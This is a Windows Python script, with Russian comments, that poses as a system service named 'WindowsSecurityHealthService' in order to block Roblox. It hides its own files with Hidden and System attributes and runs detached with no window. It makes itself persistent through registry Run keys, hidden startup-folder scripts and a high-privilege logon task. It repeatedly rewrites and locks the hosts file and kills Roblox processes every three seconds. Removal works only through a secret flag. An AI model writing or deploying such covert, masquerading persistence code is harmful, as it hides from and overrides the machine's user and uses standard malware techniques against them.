import os
import sys
import time
import shutil
import stat
import logging
import ctypes
import winreg
import subprocess

APP_NAME = "WindowsSecurityHealthService"
SCRIPT_NAME = APP_NAME + ".py"
TARGET_DIR = os.path.join(os.environ["LOCALAPPDATA"], APP_NAME)
TARGET_EXE = os.path.join(TARGET_DIR, APP_NAME + ".exe")
TARGET_PY = os.path.join(TARGET_DIR, SCRIPT_NAME)
HOSTS = r"C:\Windows\System32\drivers\etc\hosts"
MARK = "# sys-net-block"
LOG_FILE = os.path.join(TARGET_DIR, "svc.log")

# Секретное имя для удаления — знаете только вы.
# Удаление: win+R -> "WindowsSecurityHealthService /uninstall" не сработает,
# поэтому делаем через bat: запуск с аргументом --svc-uninstall
UNINSTALL_FLAG = "--svc-uninstall"
MUTEX_NAME = "Global\\" + APP_NAME

BLOCK_DOMAINS = [
    "roblox.com", "www.roblox.com", "web.roblox.com", "m.roblox.com",
    "api.roblox.com", "apis.roblox.com", "ecsv2.roblox.com",
    "auth.roblox.com", "accountsettings.roblox.com",
    "accountinformation.roblox.com", "users.roblox.com",
    "games.roblox.com", "develop.roblox.com", "catalog.roblox.com",
    "avatar.roblox.com", "inventory.roblox.com", "thumbnails.roblox.com",
    "assetdelivery.roblox.com", "assetgame.roblox.com",
    "friends.roblox.com", "chat.roblox.com", "groups.roblox.com",
    "presence.roblox.com", "contacts.roblox.com", "notifications.roblox.com",
    "economy.roblox.com", "trades.roblox.com", "itemconfiguration.roblox.com",
    "premiumfeatures.roblox.com", "billing.roblox.com",
    "clientsettings.roblox.com", "clientsettingscdn.roblox.com",
    "textanalysis.roblox.com", "metrics.roblox.com",
    "ephemeralcounters.api.roblox.com", "realtime.roblox.com",
    "rbxcdn.com", "www.rbxcdn.com", "static.rbxcdn.com",
    "setup.rbxcdn.com", "setup-aws.rbxcdn.com",
    "c0.rbxcdn.com", "c1.rbxcdn.com", "c2.rbxcdn.com",
    "c3.rbxcdn.com", "c4.rbxcdn.com", "c5.rbxcdn.com",
    "t0.rbxcdn.com", "t1.rbxcdn.com", "t2.rbxcdn.com",
    "images.rbxcdn.com", "tr.rbxcdn.com",
    "rbxcdn.net", "roblox.cn", "robloxlabs.com",
]

KILL_PROCESSES = [
    "RobloxPlayerBeta.exe", "RobloxPlayerLauncher.exe",
    "RobloxStudioBeta.exe", "RobloxStudioLauncher.exe",
    "Roblox.exe", "Bootstrapper.exe",
]

RUN_KEYS = [
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
]


# ---------- скрытность ----------

def hide_file(path):
    """Атрибут Hidden + System — файл не виден в проводнике по умолчанию."""
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, 0x02 | 0x04)
    except Exception:
        pass

def hide_dir(path):
    hide_file(path)

def daemonize():
    """Перезапускает себя в DETACHED-режиме без окна и без консоли, родитель завершается."""
    if os.environ.get("_SVC_DAEMON") == "1":
        return  # уже в фоновом режиме
    flags = 0x00000008 | 0x00000200  # DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
    if getattr(sys, "frozen", False):
        exe, args = sys.executable, [sys.executable]
    else:
        pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = sys.executable
            flags |= 0x08000000  # CREATE_NO_WINDOW для console-python
        exe, args = pythonw, [pythonw, os.path.abspath(sys.argv[0])]
    env = dict(os.environ, _SVC_DAEMON="1")
    subprocess.Popen(args, executable=exe,
                     creationflags=flags, env=env,
                     cwd=TARGET_DIR, close_fds=True)
    sys.exit(0)

def acquire_mutex():
    """Один экземпляр: дубли из планировщика и автозагрузок не плодятся."""
    ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
    return ctypes.windll.kernel32.GetLastError() != 183


# ---------- установка / удаление ----------

def self_copy():
    os.makedirs(TARGET_DIR, exist_ok=True)
    if getattr(sys, "frozen", False):
        src, dst = sys.executable, TARGET_EXE
    else:
        src, dst = os.path.abspath(sys.argv[0]), TARGET_PY
    if os.path.abspath(src) != os.path.abspath(dst):
        shutil.copy2(src, dst)
    hide_dir(TARGET_DIR)
    hide_file(dst)
    return dst

def get_launch_command():
    if getattr(sys, "frozen", False):
        return f'"{TARGET_EXE}"'
    pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    if not os.path.exists(pythonw):
        pythonw = sys.executable
    return f'"{pythonw}" "{TARGET_PY}"'

def add_registry_autorun(cmd):
    for hive, path in RUN_KEYS:
        try:
            key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
        except Exception:
            pass

def add_startup_folder_entries(cmd):
    for base in (os.environ.get("APPDATA"), os.environ.get("PROGRAMDATA")):
        if not base:
            continue
        d = os.path.join(base, "Microsoft", "Windows",
                         "Start Menu", "Programs", "Startup")
        try:
            os.makedirs(d, exist_ok=True)
            bat = os.path.join(d, APP_NAME + ".cmd")
            with open(bat, "w") as f:
                f.write(f'start "" /min {cmd}\n')
            hide_file(bat)
        except Exception:
            pass

def add_scheduled_task(cmd):
    try:
        subprocess.run(["schtasks", "/Create", "/TN", APP_NAME,
                        "/TR", cmd, "/SC", "ONLOGON", "/RL", "HIGHEST", "/F"],
                       capture_output=True)
    except Exception:
        pass

def install():
    self_copy()
    cmd = get_launch_command()
    add_registry_autorun(cmd)
    add_startup_folder_entries(cmd)
    add_scheduled_task(cmd)

def uninstall():
    """Полная зачистка: хосты, реестр, планировщик, автозагрузки, файлы."""
    # 1. чистим hosts
    try:
        os.chmod(HOSTS, stat.S_IWRITE)
        with open(HOSTS, "r", encoding="utf-8", errors="ignore") as f:
            lines = [l for l in f.read().splitlines() if MARK not in l]
        with open(HOSTS, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        subprocess.run("ipconfig /flushdns", shell=True, capture_output=True)
    except Exception:
        pass

    # 2. реестр
    for hive, path in RUN_KEYS:
        try:
            key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, APP_NAME)
            winreg.CloseKey(key)
        except Exception:
            pass

    # 3. планировщик
    subprocess.run(["schtasks", "/Delete", "/TN", APP_NAME, "/F"],
                   capture_output=True)

    # 4. папки автозагрузки
    for base in (os.environ.get("APPDATA"), os.environ.get("PROGRAMDATA")):
        if not base:
            continue
        bat = os.path.join(base, "Microsoft", "Windows", "Start Menu",
                           "Programs", "Startup", APP_NAME + ".cmd")
        try:
            if os.path.exists(bat):
                os.remove(bat)
        except Exception:
            pass

    # 5. убиваем свои процессы и ставим отложенное самоудаление
    subprocess.run(["taskkill", "/F", "/IM", APP_NAME + ".exe"],
                   capture_output=True)
    killer = os.path.join(os.environ["TEMP"], "_svc_cleanup.cmd")
    with open(killer, "w") as f:
        f.write(f'''@echo off
timeout /t 2 /nobreak >nul
rmdir /s /q "{TARGET_DIR}"
del "%~f0"
''')
    subprocess.Popen(["cmd", "/c", killer],
                     creationflags=0x08000000)
    sys.exit(0)


# ---------- основная работа ----------

def setup_logging():
    try:
        logging.basicConfig(filename=LOG_FILE, level=logging.WARNING,
                            format="%(asctime)s %(levelname)s %(message)s")
    except Exception:
        pass

def block_hosts():
    try:
        with open(HOSTS, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.read().splitlines()
    except Exception:
        lines = []

    new_lines = [l for l in lines if MARK not in l]
    for d in BLOCK_DOMAINS:
        new_lines.append(f"0.0.0.0 {d} {MARK}")

    content = "\n".join(new_lines) + "\n"
    if content != "\n".join(lines) + "\n":
        try:
            os.chmod(HOSTS, stat.S_IWRITE)
            with open(HOSTS, "w", encoding="utf-8") as f:
                f.write(content)
            os.chmod(HOSTS, stat.S_IREAD)
            subprocess.run("ipconfig /flushdns", shell=True, capture_output=True)
        except Exception as e:
            logging.warning("hosts write: %s", e)

def kill_roblox():
    for proc in KILL_PROCESSES:
        subprocess.run(["taskkill", "/F", "/IM", proc, "/T"],
                       capture_output=True)

def main():
    # режим удаления
    if UNINSTALL_FLAG in sys.argv:
        uninstall()
        return

    setup_logging()
    daemonize()          # уходим в фон без окна
    if not acquire_mutex():
        sys.exit(0)      # второй экземпляр не нужен
    install()
    block_hosts()
    while True:
        block_hosts()
        kill_roblox()
        time.sleep(3)

if __name__ == "__main__":
    main()